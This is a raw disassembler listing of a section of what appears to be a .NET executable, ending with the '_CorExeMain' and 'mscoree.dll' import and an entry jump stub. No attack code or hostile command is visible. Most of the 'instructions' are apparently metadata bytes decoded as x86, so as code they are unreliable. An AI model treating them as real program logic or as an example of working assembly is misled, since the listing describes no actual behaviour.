  40c1f1:	80 d9 11             	sbb    $0x11,%cl
  40c1f4:	80 dd 05             	sbb    $0x5,%ch
  40c1f7:	00 02                	add    %al,(%edx)
  40c1f9:	02 0e                	add    (%esi),%cl
  40c1fb:	0e                   	push   %cs
  40c1fc:	06                   	push   %es
  40c1fd:	20 01                	and    %al,(%ecx)
  40c1ff:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c204:	20 01                	and    %al,(%ecx)
  40c206:	08 08                	or     %cl,(%eax)
  40c208:	07                   	pop    %es
  40c209:	00 01                	add    %al,(%ecx)
  40c20b:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c210:	07                   	pop    %es
  40c211:	20 02                	and    %al,(%edx)
  40c213:	01 12                	add    %edx,(%edx)
  40c215:	80 c9 08             	or     $0x8,%cl
  40c218:	06                   	push   %es
  40c219:	20 01                	and    %al,(%ecx)
  40c21b:	01 12                	add    %edx,(%edx)
  40c21d:	80 f1 09             	xor    $0x9,%cl
  40c220:	20 02                	and    %al,(%edx)
  40c222:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c227:	80 f5 05             	xor    $0x5,%ch
  40c22a:	20 02                	and    %al,(%edx)
  40c22c:	08 08                	or     %cl,(%eax)
  40c22e:	08 06                	or     %al,(%esi)
  40c230:	20 02                	and    %al,(%edx)
  40c232:	01 12                	add    %edx,(%edx)
  40c234:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c239:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c23c:	09 20                	or     %esp,(%eax)
  40c23e:	03 01                	add    (%ecx),%eax
  40c240:	12 61 02             	adc    0x2(%ecx),%ah
  40c243:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c249:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c24f:	01 0e                	add    %ecx,(%esi)
  40c251:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c257:	02 09                	add    (%ecx),%cl
  40c259:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c25c:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c262:	0c 20                	or     $0x20,%al
  40c264:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c269:	08 08                	or     %cl,(%eax)
  40c26b:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c271:	01 11                	add    %edx,(%ecx)
  40c273:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c279:	02 12                	add    (%edx),%dl
  40c27b:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c27e:	02 08                	add    (%eax),%cl
  40c280:	08 05 20 01 08 12    	or     %al,0x12080120
  40c286:	25 06 00 02 08       	and    $0x8020006,%eax
  40c28b:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c290:	03 08                	add    (%eax),%ecx
  40c292:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c297:	20 01                	and    %al,(%ecx)
  40c299:	01 12                	add    %edx,(%edx)
  40c29b:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c2a1:	1c 0c                	sbb    $0xc,%al
  40c2a3:	07                   	pop    %es
  40c2a4:	06                   	push   %es
  40c2a5:	1c 02                	sbb    $0x2,%al
  40c2a7:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c2ac:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c2b2:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c2b5:	02 07                	add    (%edi),%al
  40c2b7:	20 02                	and    %al,(%edx)
  40c2b9:	02 08                	add    (%eax),%cl
  40c2bb:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c2c1:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c2c7:	07                   	pop    %es
  40c2c8:	0a 12                	or     (%edx),%dl
  40c2ca:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c2d1:	08 12 81 
  40c2d4:	41                   	inc    %ecx
  40c2d5:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c2db:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c2e0:	4d                   	dec    %ebp
  40c2e1:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c2e6:	0e                   	push   %cs
  40c2e7:	05 00 00 12 81       	add    $0x81120000,%eax
  40c2ec:	41                   	inc    %ecx
  40c2ed:	05 20 00 12 81       	add    $0x81120020,%eax
  40c2f2:	55                   	push   %ebp
  40c2f3:	06                   	push   %es
  40c2f4:	00 00                	add    %al,(%eax)
  40c2f6:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c2fb:	00 01                	add    %al,(%ecx)
  40c2fd:	0e                   	push   %cs
  40c2fe:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c303:	01 11                	add    %edx,(%ecx)
  40c305:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c30c:	41                   	inc    %ecx
  40c30d:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c313:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c31a:	49                   	dec    %ecx
  40c31b:	0e                   	push   %cs
  40c31c:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c322:	0e                   	push   %cs
  40c323:	0e                   	push   %cs
  40c324:	0e                   	push   %cs
  40c325:	0e                   	push   %cs
  40c326:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c32b:	1c 07                	sbb    $0x7,%al
  40c32d:	20 02                	and    %al,(%edx)
  40c32f:	01 0e                	add    %ecx,(%esi)
  40c331:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c337:	0a 02                	or     (%edx),%al
  40c339:	10 07                	adc    %al,(%edi)
  40c33b:	06                   	push   %es
  40c33c:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c342:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c348:	0e                   	push   %cs
  40c349:	02 05 20 00 12 81    	add    0x81120020,%al
  40c34f:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c355:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c35b:	91                   	xchg   %eax,%ecx
  40c35c:	04 20                	add    $0x20,%al
  40c35e:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c361:	04 07                	add    $0x7,%al
  40c363:	02 02                	add    (%edx),%al
  40c365:	02 03                	add    (%ebx),%al
  40c367:	20 00                	and    %al,(%eax)
  40c369:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c36c:	02 18                	add    (%eax),%bl
  40c36e:	02 03                	add    (%ebx),%al
  40c370:	07                   	pop    %es
  40c371:	01 0e                	add    %ecx,(%esi)
  40c373:	05 00 00 12 81       	add    $0x81120000,%eax
  40c378:	9d                   	popf
  40c379:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c37e:	1c 0a                	sbb    $0xa,%al
  40c380:	07                   	pop    %es
  40c381:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c386:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c38b:	20 01                	and    %al,(%ecx)
  40c38d:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c393:	0e                   	push   %cs
  40c394:	08 08                	or     %cl,(%eax)
  40c396:	06                   	push   %es
  40c397:	07                   	pop    %es
  40c398:	02 02                	add    (%edx),%al
  40c39a:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c3a0:	0e                   	push   %cs
  40c3a1:	0e                   	push   %cs
  40c3a2:	0e                   	push   %cs
  40c3a3:	05 20 00 11 81       	add    $0x81110020,%eax
  40c3a8:	ad                   	lods   %ds:(%esi),%eax
  40c3a9:	05 00 00 12 81       	add    $0x81120000,%eax
  40c3ae:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c3b3:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c3b9:	02 11                	add    (%ecx),%dl
  40c3bb:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c3c1:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c3c8:	12 81 8d 
  40c3cb:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c3d1:	12 41 01             	adc    0x1(%ecx),%al
  40c3d4:	0e                   	push   %cs
  40c3d5:	05 20 01 01 13       	add    $0x13010120,%eax
  40c3da:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c3e0:	00 06                	add    %al,(%esi)
  40c3e2:	00 02                	add    %al,(%edx)
  40c3e4:	0e                   	push   %cs
  40c3e5:	0e                   	push   %cs
  40c3e6:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c3eb:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c3f0:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c3f6:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c3fc:	c5 09                	lds    (%ecx),%ecx
  40c3fe:	00 02                	add    %al,(%edx)
  40c400:	02 11                	add    (%ecx),%dl
  40c402:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c408:	07                   	pop    %es
  40c409:	02 12                	add    (%edx),%dl
  40c40b:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c410:	01 02                	add    %eax,(%edx)
  40c412:	0e                   	push   %cs
  40c413:	10 02                	adc    %al,(%edx)
  40c415:	06                   	push   %es
  40c416:	00 01                	add    %al,(%ecx)
  40c418:	01 12                	add    %edx,(%edx)
  40c41a:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c420:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c427:	0e                   	push   %cs
  40c428:	1c 11                	sbb    $0x11,%al
  40c42a:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c430:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c437:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c43d:	05 07 20 02 12       	add    $0x12022007,%eax
  40c442:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c449:	12 60 0e             	adc    0xe(%eax),%ah
  40c44c:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c451:	12 60 12             	adc    0x12(%eax),%ah
  40c454:	60                   	pusha
  40c455:	06                   	push   %es
  40c456:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c45b:	60                   	pusha
  40c45c:	10 10                	adc    %dl,(%eax)
  40c45e:	01 01                	add    %eax,(%ecx)
  40c460:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c465:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c46b:	1e                   	push   %ds
  40c46c:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c46f:	01 12                	add    %edx,(%edx)
  40c471:	60                   	pusha
  40c472:	09 20                	or     %esp,(%eax)
  40c474:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c47a:	13 00                	adc    (%eax),%eax
  40c47c:	07                   	pop    %es
  40c47d:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c482:	12 60 04             	adc    0x4(%eax),%ah
  40c485:	20 00                	and    %al,(%eax)
  40c487:	13 00                	adc    (%eax),%eax
  40c489:	05 20 01 02 13       	add    $0x13020120,%eax
  40c48e:	00 03                	add    %al,(%ebx)
  40c490:	07                   	pop    %es
  40c491:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c498:	e5 07                	in     $0x7,%eax
  40c49a:	20 01                	and    %al,(%ecx)
  40c49c:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c4a2:	20 01                	and    %al,(%ecx)
  40c4a4:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c4aa:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c4ad:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c4b3:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c4b9:	00 02                	add    %al,(%edx)
  40c4bb:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c4c1:	0e                   	push   %cs
  40c4c2:	1c 00                	sbb    $0x0,%al
  40c4c4:	05 12 82 05 11       	add    $0x11058212,%eax
  40c4c9:	82 09 0e             	orb    $0xe,(%ecx)
  40c4cc:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4d1:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c4d7:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c4dc:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c4e2:	45                   	inc    %ebp
  40c4e3:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c4e9:	4d                   	dec    %ebp
  40c4ea:	1c 12                	sbb    $0x12,%al
  40c4ec:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c4f1:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c4f6:	0e                   	push   %cs
  40c4f7:	0b 00                	or     (%eax),%eax
  40c4f9:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c4ff:	00 12                	add    %dl,(%edx)
  40c501:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c508:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c50d:	4d                   	dec    %ebp
  40c50e:	1c 12                	sbb    $0x12,%al
  40c510:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c515:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c51a:	0e                   	push   %cs
  40c51b:	17                   	pop    %ss
  40c51c:	20 0a                	and    %cl,(%edx)
  40c51e:	01 13                	add    %edx,(%ebx)
  40c520:	00 13                	add    %dl,(%ebx)
  40c522:	01 13                	add    %edx,(%ebx)
  40c524:	02 13                	add    (%ebx),%dl
  40c526:	03 13                	add    (%ebx),%edx
  40c528:	04 13                	add    $0x13,%al
  40c52a:	05 13 06 13 07       	add    $0x7130613,%eax
  40c52f:	13 08                	adc    (%eax),%ecx
  40c531:	13 09                	adc    (%ecx),%ecx
  40c533:	05 07 01 12 82       	add    $0x82120107,%eax
  40c538:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c53d:	0e                   	push   %cs
  40c53e:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c543:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c549:	06                   	push   %es
  40c54a:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c550:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c556:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c55b:	20 01                	and    %al,(%ecx)
  40c55d:	01 11                	add    %edx,(%ecx)
  40c55f:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c566:	82 31 05             	xorb   $0x5,(%ecx)
  40c569:	20 00                	and    %al,(%eax)
  40c56b:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c571:	01 12                	add    %edx,(%edx)
  40c573:	61                   	popa
  40c574:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c57a:	08 20                	or     %ah,(%eax)
  40c57c:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c582:	08 1a                	or     %bl,(%edx)
  40c584:	07                   	pop    %es
  40c585:	0a 12                	or     (%edx),%dl
  40c587:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c58e:	21 1d 05 
  40c591:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c596:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c59d:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c5a2:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c5a8:	45                   	inc    %ebp
  40c5a9:	08 08                	or     %cl,(%eax)
  40c5ab:	04 07                	add    $0x7,%al
  40c5ad:	02 02                	add    (%edx),%al
  40c5af:	08 09                	or     %cl,(%ecx)
  40c5b1:	00 02                	add    %al,(%edx)
  40c5b3:	01 12                	add    %edx,(%edx)
  40c5b5:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c5b9:	4d                   	dec    %ebp
  40c5ba:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c5bf:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c5c5:	05 08 05 07 07       	add    $0x7070508,%eax
  40c5ca:	02 12                	add    (%edx),%dl
  40c5cc:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c5d0:	08 07                	or     %al,(%edi)
  40c5d2:	04 12                	add    $0x12,%al
  40c5d4:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c5d9:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c5de:	1c 06                	sbb    $0x6,%al
  40c5e0:	07                   	pop    %es
  40c5e1:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c5e7:	20 01                	and    %al,(%ecx)
  40c5e9:	13 00                	adc    (%eax),%eax
  40c5eb:	08 04 07             	or     %al,(%edi,%eax,1)
  40c5ee:	01 12                	add    %edx,(%edx)
  40c5f0:	60                   	pusha
  40c5f1:	0e                   	push   %cs
  40c5f2:	07                   	pop    %es
  40c5f3:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c5f8:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c5fe:	12 60 07             	adc    0x7(%eax),%ah
  40c601:	07                   	pop    %es
  40c602:	04 08                	add    $0x8,%al
  40c604:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c609:	20 01                	and    %al,(%ecx)
  40c60b:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c611:	64 04 00             	fs add $0x0,%al
  40c614:	01 0b                	add    %ecx,(%ebx)
  40c616:	0a 04 00             	or     (%eax,%eax,1),%al
  40c619:	01 0b                	add    %ecx,(%ebx)
  40c61b:	0e                   	push   %cs
  40c61c:	04 00                	add    $0x0,%al
  40c61e:	01 0b                	add    %ecx,(%ebx)
  40c620:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c625:	0c 06                	or     $0x6,%al
  40c627:	00 01                	add    %al,(%ecx)
  40c629:	0b 11                	or     (%ecx),%edx
  40c62b:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c632:	04 00 01 
  40c635:	0a 0e                	or     (%esi),%cl
  40c637:	04 00                	add    $0x0,%al
  40c639:	01 0a                	add    %ecx,(%edx)
  40c63b:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c640:	0c 06                	or     $0x6,%al
  40c642:	00 01                	add    %al,(%ecx)
  40c644:	0a 11                	or     (%ecx),%dl
  40c646:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c64d:	04 00 01 
  40c650:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c655:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c659:	ad                   	lods   %ds:(%esi),%eax
  40c65a:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c65f:	0c 07                	or     $0x7,%al
  40c661:	07                   	pop    %es
  40c662:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c668:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c66d:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c673:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c679:	12 60 1d             	adc    0x1d(%eax),%ah
  40c67c:	0e                   	push   %cs
  40c67d:	0e                   	push   %cs
  40c67e:	08 12                	or     %dl,(%edx)
  40c680:	60                   	pusha
  40c681:	08 05 07 01 12 81    	or     %al,0x81120107
  40c687:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c68c:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c693:	05 08 08 06 00       	add    $0x60808,%eax
  40c698:	02 07                	add    (%edi),%al
  40c69a:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c69f:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c6a6:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c6ac:	00 02                	add    %al,(%edx)
  40c6ae:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c6b4:	02 0b                	add    (%ebx),%cl
  40c6b6:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6bb:	02 06                	add    (%esi),%al
  40c6bd:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6c2:	02 0a                	add    (%edx),%cl
  40c6c4:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c6c9:	03 12                	add    (%edx),%edx
  40c6cb:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c6d2:	07 02 12 
  40c6d5:	60                   	pusha
  40c6d6:	02 04 07             	add    (%edi,%eax,1),%al
  40c6d9:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c6df:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c6e4:	04 1d                	add    $0x1d,%al
  40c6e6:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c6eb:	06                   	push   %es
  40c6ec:	07                   	pop    %es
  40c6ed:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c6f3:	00 01                	add    %al,(%ecx)
  40c6f5:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c6fa:	06                   	push   %es
  40c6fb:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c701:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c707:	05 08 20 02 01       	add    $0x1022008,%eax
  40c70c:	12 61 11             	adc    0x11(%ecx),%ah
  40c70f:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c713:	04 12                	add    $0x12,%al
  40c715:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c71c:	1d 05 00 
  40c71f:	00 48 c7             	add    %cl,-0x39(%eax)
	...
  40c72a:	00 00                	add    %al,(%eax)
  40c72c:	5e                   	pop    %esi
  40c72d:	c7 00 00 00 20 00    	movl   $0x200000,(%eax)
	...
  40c747:	00 50 c7             	add    %dl,-0x39(%eax)
	...
  40c752:	5f                   	pop    %edi
  40c753:	43                   	inc    %ebx
  40c754:	6f                   	outsl  %ds:(%esi),(%dx)
  40c755:	72 45                	jb     0x40c79c
  40c757:	78 65                	js     0x40c7be
  40c759:	4d                   	dec    %ebp
  40c75a:	61                   	popa
  40c75b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c762:	72 65                	jb     0x40c7c9
  40c764:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c768:	6c                   	insb   (%dx),%es:(%edi)
  40c769:	00 00                	add    %al,(%eax)
  40c76b:	00 00                	add    %al,(%eax)
  40c76d:	00 ff                	add    %bh,%bh
  40c76f:	25 00 20 40 00       	and    $0x402000,%eax
